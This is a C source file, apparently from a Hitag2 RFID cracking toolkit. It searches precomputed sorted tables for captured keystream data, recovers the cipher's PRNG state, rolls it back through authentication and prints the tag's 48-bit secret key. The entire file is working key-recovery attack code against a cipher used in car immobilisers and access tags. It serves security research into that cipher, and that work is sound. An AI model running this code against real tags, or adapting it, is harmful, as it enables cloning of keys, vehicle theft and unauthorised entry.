/*
 * ht2crack2search.c
 * this searches the sorted tables for the given RNG data, retrieves the matching
 * PRNG state, checks it is correct, and then rolls back the PRNG to recover the key
 */

#include "ht2crackutils.h"

#define INPUTFILE "sorted/%02x/%02x.bin"
#define DATASIZE 10

struct rngdata {
    unsigned char *data;
    int len;
};

static int datacmp(const void *p1, const void *p2) {
    unsigned char *d1 = (unsigned char *)p1;
    unsigned char *d2 = (unsigned char *)p2;

    return memcmp(d1, d2, DATASIZE - 6);
}

static int loadrngdata(struct rngdata *r, char *file) {
    int fd;
    int i, j;
    int nibble;
    struct stat filestat;
    unsigned char *data;

    if (!r || !file) {
        printf("loadrngdata: invalid params\n");
        return 0;
    }

    fd = open(file, O_RDONLY);

    if (fd <= 0) {
        printf("cannot open file %s\n", file);
        exit(1);
    }

    if (fstat(fd, &filestat)) {
        printf("cannot stat file %s\n", file);
        exit(1);
    }

    if (filestat.st_size < 6) {
        printf("file %s is too small\n", file);
        exit(1);
    }

    data = mmap((caddr_t)0, filestat.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (data == MAP_FAILED) {
        printf("cannot mmap file %s\n", file);
        exit(1);
    }

    r->len = filestat.st_size / 2;
//    printf("r->len = %d\n", r->len);

    r->data = (unsigned char *)calloc(1, r->len);
    if (!(r->data)) {
        printf("cannot calloc\n");
        exit(1);
    }

    j = 0;
    nibble = 0;
    for (i = 0; (i < filestat.st_size) && (j < r->len); i++) {
        if ((data[i] != 0x0a) && (data[i] != 0x0d) && (data[i] != 0x20)) {
            if (!nibble) {
                r->data[j] = hex2bin(data[i]) << 4;
                nibble = 1;
            } else {
                r->data[j] |= hex2bin(data[i]);
                nibble = 0;
                j++;
            }
        }
    }

    r->len = j;

    munmap(data, filestat.st_size);
    close(fd);

    return 1;
}

static int makecand(unsigned char *c, struct rngdata *r, int bitoffset) {
    int bytenum;
    int bitnum;
    int i;

    if (!c || !r || (bitoffset > ((r->len * 8) - 48))) {
        printf("makecand: invalid params\n");
        return 0;
    }

    bytenum = bitoffset / 8;
    bitnum = bitoffset % 8;

    for (i = 0; i < 6; i++) {
        if (!bitnum) {
            c[i] = r->data[bytenum + i];
        } else {
            c[i] = (r->data[bytenum + i] << bitnum) | (r->data[bytenum + i + 1] >> (8 - bitnum));
        }
    }

    return 1;
}


// test the candidate against the next or previous rng data
static int testcand(const unsigned char *f, unsigned char *rt, int fwd) {
    Hitag_State hstate;
    int i;
    uint32_t ks1;
    uint32_t ks2;
    unsigned char buf[6];

    // build the prng state at the candidate
    hstate.shiftreg = 0;
    for (i = 0; i < 6; i++) {
        hstate.shiftreg = (hstate.shiftreg << 8) | f[i + 4];
    }
    buildlfsr(&hstate);

    if (fwd) {
        // roll forwards 48 bits
        hitag2_nstep(&hstate, 48);
    } else {
        // roll backwards 48 bits
        rollback(&hstate, 48);
        buildlfsr(&hstate);
    }

    // get 48 bits of RNG from the rolled to state
    ks1 = hitag2_nstep(&hstate, 24);
    ks2 = hitag2_nstep(&hstate, 24);

    writebuf(buf, ks1, 3);
    writebuf(buf + 3, ks2, 3);

    // compare them
    if (!memcmp(buf, rt, 6)) {
        return 1;
    } else {
        return 0;
    }
}

static int searchcand(unsigned char *c, unsigned char *rt, int fwd, unsigned char *m, unsigned char *s) {
    int fd;
    struct stat filestat;
    char file[64];
    unsigned char *data;
    unsigned char item[10];
    unsigned char *found = NULL;


    if (!c || !rt || !m || !s) {
        printf("searchcand: invalid params\n");
        return 0;
    }

    snprintf(file, sizeof(file), INPUTFILE, c[0], c[1]);

    fd = open(file, O_RDONLY);
    if (fd <= 0) {
        printf("cannot open table file %s\n", file);
        exit(1);
    }

    if (fstat(fd, &filestat)) {
        printf("cannot stat file %s\n", file);
        exit(1);
    }

    data = mmap((caddr_t)0, filestat.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (data == MAP_FAILED) {
        printf("cannot mmap file %s\n", file);
        exit(1);
    }

    memcpy(item, c + 2, 4);

    found = (unsigned char *)bsearch(item, data, filestat.st_size / DATASIZE, DATASIZE, datacmp);

    if (found) {

        // our candidate is in the table
        // go backwards and see if there are other matches
        while (((found - data) >= DATASIZE) && (!memcmp(found - DATASIZE, item, 4))) {
            found = found - DATASIZE;
        }

        // now test all matches
        while (((found - data) <= (filestat.st_size - DATASIZE)) && (!memcmp(found, item, 4))) {
            if (testcand(found, rt, fwd)) {
                memcpy(m, c, 2);
                memcpy(m + 2, found, 4);
                memcpy(s, found + 4, 6);

                munmap(data, filestat.st_size);
                close(fd);
                return 1;
            }

            found = found + DATASIZE;
        }
    }

    munmap(data, filestat.st_size);
    close(fd);

    return 0;

}

static int findmatch(struct rngdata *r, unsigned char *outmatch, unsigned char *outstate, int *bitoffset) {
    int i;
    int bitlen;
    unsigned char cand[6];
    unsigned char rngtest[6];
    int fwd;

    if (!r || !outmatch || !outstate || !bitoffset) {
        printf("findmatch: invalid params\n");
        return 0;
    }

    bitlen = r->len * 8;

    for (i = 0; i <= bitlen - 48; i++) {
        // print progress
        if ((i % 100) == 0) {
            printf("searching on bit %d\n", i);
        }

        if (!makecand(cand, r, i)) {
            printf("cannot makecand, %d\n", i);
            return 0;
        }
//        printf("cand: %02x %02x %02x %02x %02x %02x : ", cand[0], cand[1], cand[2], cand[3], cand[4], cand[5]);
//        printbin(cand);

        /* make following or preceding RNG test data to confirm match */
        if (i < (bitlen - 96)) {
            if (!makecand(rngtest, r, i + 48)) {
                printf("cannot makecand rngtest %d + 48\n", i);
                return 0;
            }
            fwd = 1;
        } else {
            if (!makecand(rngtest, r, i - 48)) {
                printf("cannot makecand rngtest %d - 48\n", i);
                return 0;
            }
            fwd = 0;
        }

        if (searchcand(cand, rngtest, fwd, outmatch, outstate)) {
            *bitoffset = i;
            return 1;
        }
    }

    return 0;
}

static void rollbackrng(Hitag_State *hstate, const unsigned char *s, int offset) {
    int i;

    if (!s) {
        printf("rollbackrng: invalid params\n");
        return;
    }

    // build prng at recovered offset
    hstate->shiftreg = 0;
    for (i = 0; i < 6; i++) {
        hstate->shiftreg = (hstate->shiftreg << 8) | s[i];
    }

    printf("recovered prng state at offset %d:\n", offset);
    printstate(hstate);

    // rollback to state after auth
    rollback(hstate, offset);

    // rollback through auth (aR, p3)
    rollback(hstate, 64);

    printf("prng state after initialisation:\n");
    printstate(hstate);


}

static uint64_t recoverkey(Hitag_State *hstate, char *uidstr, char *nRstr) {
    uint64_t key;
    uint64_t keyupper;
    uint32_t uid;
    uint32_t uidtmp;
    uint32_t nRenc;
    uint32_t nR;
    uint32_t nRxork;
    uint32_t b = 0;
    int i;

    // key lower 16 bits are lower 16 bits of prng state
    key = hstate->shiftreg & 0xffff;
    nRxork = (hstate->shiftreg >> 16) & 0xffffffff;
    uid = rev32(hexreversetoulong(uidstr));
    nRenc = rev32(hexreversetoulong(nRstr));

    uidtmp = uid;
    // rollback and extract bits b
    for (i = 0; i < 32; i++) {
        hstate->shiftreg = ((hstate->shiftreg) << 1) | ((uidtmp >> 31) & 0x1);
        uidtmp = uidtmp << 1;
        b = (b << 1) | fnf(hstate->shiftreg);
    }

    printf("end state:\n");
    printstate(hstate);
    printf("b:\t\t");
    printbin2(b, 32);
    printf("\n");
    printf("nRenc:\t\t");
    printbin2(nRenc, 32);
    printf("\n");

    nR = nRenc ^ b;

    printf("nR:\t\t");
    printbin2(nR, 32);
    printf("\n");

    keyupper = nRxork ^ nR;
    key = key | (keyupper << 16);
    printf("key:\t\t");
    printbin2(key, 48);
    printf("\n");

    return key;
}


int main(int argc, char *argv[]) {
    Hitag_State hstate;
    struct rngdata rng;
    int bitoffset = 0;
    unsigned char rngmatch[6];
    unsigned char rngstate[6];
    char *uidstr;
    char *nRstr;
    uint64_t keyrev;
    uint64_t key;
    int i;

    if (argc < 4) {
        printf("%s rngdatafile UID nR\n", argv[0]);
        exit(1);
    }

    if (!loadrngdata(&rng, argv[1])) {
        printf("loadrngdata failed\n");
        exit(1);
    }

    if (!strncmp(argv[2], "0x", 2)) {
        uidstr = argv[2] + 2;
    } else {
        uidstr = argv[2];
    }

    if (!strncmp(argv[3], "0x", 2)) {
        nRstr = argv[3] + 2;
    } else {
        nRstr = argv[3];
    }


    if (!findmatch(&rng, rngmatch, rngstate, &bitoffset)) {
        printf("couldn't find a match\n");
        exit(1);
    }

    printf("found match:\n");
    printf("rngmatch = %02x %02x %02x %02x %02x %02x\n", rngmatch[0], rngmatch[1], rngmatch[2], rngmatch[3], rngmatch[4], rngmatch[5]);
    printf("rngstate = %02x %02x %02x %02x %02x %02x\n", rngstate[0], rngstate[1], rngstate[2], rngstate[3], rngstate[4], rngstate[5]);
    printf("bitoffset = %d\n", bitoffset);

    rollbackrng(&hstate, rngstate, bitoffset);

    keyrev = recoverkey(&hstate, uidstr, nRstr);
    key = rev64(keyrev);

    printf("keyrev:\t\t");
    printbin2(key, 48);
    printf("\n");

    printf("KEY:\t\t");
    for (i = 0; i < 6; i++) {
        printf("%02X", (int)(key & 0xff));
        key = key >> 8;
    }
    printf("\n");

    return 0;

}


